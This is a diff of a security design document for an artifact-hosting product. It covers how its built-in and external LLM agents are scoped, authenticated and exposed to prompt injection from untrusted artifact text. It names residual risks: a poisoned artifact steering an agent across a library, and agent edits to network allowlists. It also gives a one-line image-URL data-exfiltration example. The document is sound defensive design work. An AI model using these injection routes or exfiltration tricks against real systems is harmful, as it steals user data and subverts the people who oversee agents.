@@ -961,8 +961,8 @@ Five properties of the reporter are load-bearing:
   it would clobber decisions made elsewhere since its page loaded — and could
   express neither a block nor a return to undecided. An **agent session cannot
   reach this route at all**: `agentSubResources` is a deny-by-default
-  allowlist, and a session steered by text Exhibit did not author must not
-  approve its own network egress.
+  allowlist. That refuses this approval route, not every way to change an
+  allowlist: direct agent PATCH still accepts `network_allowlist` (§5.5).
 
 **Where the prompt is, and is not.**
 
@@ -1303,12 +1303,13 @@ is allowed; anything that produces egress or bypasses a user decision is not.**
     location cannot read it anywhere, including opened directly with the
     browser's permission already granted for the render origin (verified).
 
-## 5. The agent sidecar: an API client driven by untrusted text
+## 5. Agents: API clients driven by untrusted text
 
-Every other client of this API is driven by the person using it. The agent
-surface (`docs/agent.md`, architecture §3.7) is not: it is a `pi` subprocess
-executing tool calls an LLM emits, and the LLM's context contains text Exhibit
-did not author.
+The agent surfaces (`agent.md`, architecture §3.7) execute tool calls an LLM
+emits, and the LLM's context contains text Exhibit did not author. Pi is a
+subprocess Exhibit controls, scoped to one artifact (§5.1–5.4). An external
+agent belongs to the user and reaches their whole library (§5.5). Both use the
+ordinary HTTP API; their credentials deliberately carry different authority.
 
 **Where the untrusted text comes from.** Three channels, all inherent to the
 product rather than incidental:
@@ -1324,7 +1325,7 @@ product rather than incidental:
   `outerHTML`. The user believes they are pointing at a button; they are also
   forwarding whatever that subtree carries.
 
-### 5.1 The wall: a per-session credential scoped to one artifact
+### 5.1 Pi: a per-session credential scoped to one artifact
 
 The enforced boundary is **not** prompt wording, and not the tool schema. It is
 an authorization check on the API, in the same shape as the rest of this
@@ -1340,13 +1341,15 @@ download bridge is UX and the sandbox is the wall (§4).
 
   | Allowed | When |
   |---|---|
+  | `GET /api/agent/credential` | describes the session's own scope |
   | `POST /api/artifacts` | only while the session is still unbound |
   | `GET` / `PATCH /api/artifacts/{id}` | only the session's own artifact |
   | `GET` / `PUT` / `DELETE /api/artifacts/{id}/state` | only the session's own artifact |
   | `GET` / `PUT` / `DELETE /api/artifacts/{id}/widget` | only the session's own artifact |
+  | `GET /api/artifacts/{id}/assets` | metadata for the session's own artifact |
 
-  The two sub-resources are there because the agent has tools for them
-  (av-lvi1, av-fafu) — one allowlist entry per shipped tool, named
+  The sub-resources support the state and widget tools and source reads
+  (av-lvi1, av-fafu, av-20fk) — one allowlist entry per shipped tool, named
   individually rather than by a "sub-paths of my artifact" wildcard, so a new
   artifact route is out of reach until someone adds it here on purpose.
 
@@ -1474,7 +1477,7 @@ Exhibit: the artifact may have changed since it was last read. Use the freshly
 prepared tool result, or call `get_artifact` if preparation was unavailable.
 That is about staleness, not trust — rolling back, or an edit made in between, leaves the model holding a source that is no longer the artifact.
 
-### 5.3 Residual risk, stated plainly
+### 5.3 Pi's residual risk, stated plainly
 
 Scoping bounds the blast radius to **one artifact, not to zero.** Delimiting
 reduces the success rate of an injection; it does not eliminate it. Injected
@@ -1490,10 +1493,11 @@ user opened. What that costs, and what it does not:
   approval attaches to the artifact, not to a version of its body (`av-hrtv`).
   §6 states why re-gating on a rewrite is rejected and what actually bounds the
   risk.
-- Every write an agent makes is recorded as a version (`architecture.md` §3.3b),
-  labelled with the session and the message it was answering, so a bad write is
-  undoable. Restoring is the owner's: `versions` is absent from
-  `agentSubResources`, so a session steered by text Exhibit did not author can
+- Every source or widget change is recorded as a version (`architecture.md`
+  §3.3b), labelled with the session and the message it was answering, so it is
+  restorable. Pi can also write or erase saved state; those operations do not
+  create versions, so this guarantee does not cover them. Restoring is the
+  owner's: `versions` is absent from `agentSubResources`, so a session steered by text Exhibit did not author can
   neither read the history nor change it.
 
 ### 5.4 The usage-policy guardrail is a screen, not a wall
@@ -1514,15 +1518,110 @@ blocks when the screen fails. What it is not:
   provider account. It does nothing about what users publish, and it is not a
   topic filter.
 
+### 5.5 External agents: the owner's signed-in device
+
+A connected agent acts for the person who connected it, across their whole
+library, as a signed-in laptop does (Exh-17a5). Exhibit's job is to authenticate
+that connection, make it listable and revocable, and enforce the API's ordinary
+rules. Securing the agent itself — its other tools, what it is told to do, and
+where its token lives — is the user's job. Library scope is deliberate: a durable
+agent must be able to find “my water tracker” and work on it without the user
+opening an Exhibit chat for that one artifact first.
+
+**Owner-issued, listable, revocable** (Exh-l2xj). Only a signed-in owner, or the
+operator on a no-login instance, can issue a grant. Settings → Connected agents
+lists its label, client, creation time and last use, and offers Revoke. A pasted
+token is shown once. Tokens start with `exgrant_`; only their SHA-256 digests
+are stored in `agent_grants` (migration 043), so listing connections cannot
+recover a credential. They survive restarts and have no expiry; deleting a grant
+makes the next authenticated request return `401`. An agent cannot issue or
+manage grants, so it cannot extend its own connection's lifetime.
+
+**One credential, one owner's own artifacts.** `agentScopeAllows` admits
+listing/searching and creating artifacts, reading and PATCHing them, read-only
+state and asset metadata, and widget reads/writes. Owner-scoped queries exclude
+other owners and artifacts shared with this owner alike (`404`). Routes outside
+that allowlist are refused, including shares, artifact deletion, versions and
+restore, account/admin operations, and pages. The MCP tools are narrower still
+(`agent.md`): they expose no widget deletion or library organization tools.
+
+**The write path is unchanged** (Exh-q6xo). Tools call the HTTP API with the
+caller's grant, and source/widget saves carry the revision last read for that
+artifact. A stale revision refuses the save; the agent must read again and
+reapply its change. Every source or widget change is a restorable version with
+`origin=agent`; its message is the grant's label and its session is `grant:<id>`,
+resolved from the grant row, never supplied by the caller. Saved data is
+read-only in both the tools and the library-grant route policy. A state write or
+erasure creates no version of its own, so allowing one would promise recovery
+that source and widget history cannot provide.
+
+**Untrusted text is still data, but the blast radius is the library.** The MCP
+server's instructions contain no artifact text. Source, titles, tags, state and
+widgets reach the external agent only as tool results, with the same data
+contract Pi receives from `internal/agentguidance` (av-5s7g, Exh-q6xo). The
+user's client decides how to present and obey those instructions. **One poisoned
+artifact can steer an external agent into editing other artifacts in the same
+library.** This is accepted residual risk, not something tool-result roles or
+revision checks eliminate. The enforced bounds are the owner's own artifacts,
+read-only saved data, restorable source/widget changes, and no share or artifact
+deletion routes. There are no MCP tools for network allowlist or capability
+approvals. That last limit is a tool-surface decision, not an API prohibition:
+an agent bearer can still PATCH `network_allowlist` and capability approval
+fields, just as Pi's bearer can. Source/widget history does not restore those
+approvals. Nor can revocation recall content the external agent already read.
+
+**OAuth obtains the same grant, not a second kind of authority** (Exh-rhlq).
+The core exposes its built-in authorization server only with `MCP_URL` set.
+Dynamic client registration is open: a signed, stateless client id carries the
+client's name and redirect URIs, with no registration table or client secret.
+A registered name is self-asserted, not a trusted endorsement. Consent shows
+that name and the redirect destination, and approves the whole library — no
+artifact picker. Redirect hosts must be ASCII, with IDNA Registration validation
+for DNS names; internationalized domains must be registered as punycode. Unicode
+hosts and control/format characters, including those encoded in punycode, are
+rejected rather than silently normalized, preserving exact redirect matching and
+an ASCII destination on consent. Client names reject control/format characters;
+consent isolates the name and host, and Settings isolates names, with `bdi`.
+Login preserves the return to consent. The consent page cannot be framed; its
+POST checks the origin as well as the ordinary session boundary. Errors before
+a decision render locally, never redirect to a self-registered client. Only a
+successful approval or an explicit Deny redirects to the client.
+
+Registration, token exchange and consent POSTs have a 64 KiB pre-parse body cap,
+including chunked requests (`413` on overrun); a smaller global body limit still
+wins. The signed client id is limited to 16 KiB at registration and use, leaving
+room in the core's 64 KiB request-line/header budget for authorization parameters.
+Authorization codes are single-use, five-minute values in bounded memory: 16
+pending codes per owner alongside the global limit of 1024. A full owner quota
+renders a clear local `429` page; redemption and expiry release capacity, so one
+owner cannot fill the global pool. Each code is bound
+to the approving owner, client, redirect URI, PKCE S256 challenge and
+`resource=MCP_URL`. Exchange checks those bindings and creates a library grant
+named after the client. There is no refresh token and no access-token expiry;
+Settings revocation is the way to end the connection. Clerk is not required.
+
+**The MCP service is a satellite, not a second authority** (Exh-uhvu, Exh-354p).
+`exhibit-mcp` serves Streamable HTTP and public protected-resource metadata;
+its `WWW-Authenticate` challenge points clients at that metadata, which names
+the core as authorization server. It has no database or secrets of its own. On
+every MCP request, including an existing session's continuation, it asks the
+core's `GET /api/agent/credential` to verify the bearer, then tools use that
+same bearer for ordinary API requests. Core verification failure refuses access;
+an outage is `503`, never cached permission. Without `MCP_URL` the core offers
+no new connections, grants or OAuth endpoints; existing grants remain listable
+and revocable. Taking the endpoint offline also requires stopping the satellite.
+The core never serves `/mcp`. See `deployment.md` for the optional service and
+proxy routing.
+
 ## 6. Residual risk
 
 Accepted, with eyes open (see the PRD §6.4): the model controls what an artifact
 *reaches*, not what it *displays* — a malicious artifact can still render
 convincing fake UI. The isolation in §1 caps the blast radius (no real session to
-steal). Auth today is a single static bearer token scoped for single-user,
-trusted-circle deployment; the middleware seam exists to swap in real identity
-without changing the API contract. Because that one token is the whole library,
-it travels only in an `Authorization` header, compared in constant time, and
+steal). Sessions identify signed-in owners; a no-login instance can use the
+operator's static bearer token, and external agents use the grants in §5.5.
+Because the static token carries full API authority, it travels only in an
+`Authorization` header, compared in constant time, and
 never in a URL — the agent's SSE stream, which `EventSource` cannot send a
 header on, takes a single-use, seconds-lived, session-bound ticket instead
 (av-rgp1, `architecture.md` §3.7), so the master credential never appears in a
@@ -1539,9 +1638,8 @@ on an artifact's allowlist stays reachable by whatever that artifact later
 contains — including a body an agent rewrote. This is deliberate: users approve
 *origins*, not code, and running unreviewed code safely is the whole purpose of
 the sandbox (§1). Re-gating on a body change would be code review by another
-name — it would fire on every agent edit, since the agent tools always save
-whole documents — and it would be noisy on benign edits while blind on hostile
-ones: the CSP applies one flat allowlist to every directive, so "this origin
+name — it would fire on every agent edit, including targeted edits — and it
+would be noisy on benign edits while blind on hostile ones: the CSP applies one flat allowlist to every directive, so "this origin
 moved from a script import to a fetch" is no change in capability; exfiltration
 needs no `connect-src` at all (`<img src="https://X/?d=…">` carries the payload
 in the URL); and the scan is deliberately evadable by a URL constructed at
